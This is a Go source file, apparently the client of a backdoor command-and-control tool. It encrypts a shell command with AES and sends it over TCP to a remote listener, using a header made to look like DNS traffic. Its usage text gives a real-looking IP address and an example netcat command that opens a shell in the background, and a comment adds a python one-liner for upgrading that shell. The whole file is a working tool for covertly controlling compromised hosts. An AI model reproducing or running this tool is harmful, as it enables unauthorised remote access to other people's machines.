package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base32"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
)

var (
	ip         string
	port       string
	address    string
	header     string
	command    string
	commandXOR string
	message    string
	buffer     int32 = 1024
)

func main() {

	checkArguments()
	commandXOR = encryptCommand(header, command)
	sendPacket()

}

// check if all arguments are not empty and correct
func checkArguments() {

	incorrect := false
	// need 4 arguments device tcp port header
	if len(os.Args) != 5 {
		fmt.Println("not enough parameters, 4 are needed")
		showUsage()
	}
	// check if arguments are correct
	ip = os.Args[1]
	if ip == "" {
		fmt.Println("ip is empty")
		incorrect = true
	}

	port = os.Args[2]
	if _, err := strconv.Atoi(port); err != nil {
		fmt.Println(port, "is not a correct TCP port")
		incorrect = true
	}

	header = os.Args[3]
	if header == "" {
		fmt.Println("header is empty")
		incorrect = true
	}

	command = os.Args[4]
	if command == "" {
		fmt.Println("command is empty")
		incorrect = true
	}

	if incorrect {
		showUsage()
	}

	address = strings.Join([]string{ip, ":", port}, "")

}

// show helper on how to use this client
func showUsage() {
	fmt.Println("usage: go run client.go 'IP' 'PORT' 'HEADER' 'COMMAND' ")
	fmt.Println("example: ./client '51.15.85.68' 2222 'DNS_Session' 'nc -nv 127.0.0.1 1337 -e /bin/sh > /dev/null 2>&1 &' ")
	// to spawn a tty if python is installed : python -c 'import pty; pty.spawn("/bin/sh")'
	log.Fatal()
}

// TCP send the 'header':'commandXOR' to 'ip' on 'port'
func sendPacket() {
	conn, _ := net.Dial("tcp", address)
	message = strings.Join([]string{header, ":", commandXOR}, "")

	fmt.Fprintf(conn, message+"\n")
	fmt.Println("Sending tcp packet:", message, "to", ip, "on port", port, "\n")

	resp, _ := bufio.NewReader(conn).ReadString('\n')
	fmt.Print("Receiving from server: " + resp)
}

// encrypt string to base64 crypto using AES
func encryptCommand(key string, text string) string {
	textBytes := []byte(text)

	block, err := aes.NewCipher([]byte(base32.StdEncoding.EncodeToString([]byte(key))))
	if err != nil {
		log.Fatal(err)
	}

	// The IV needs to be unique, but not secure. Therefore it's common to
	// include it at the beginning of the ciphertext.
	ciphertext := make([]byte, aes.BlockSize+len(textBytes))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		log.Fatal(err)
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], textBytes)

	// convert to base64
	return base64.URLEncoding.EncodeToString(ciphertext)
}
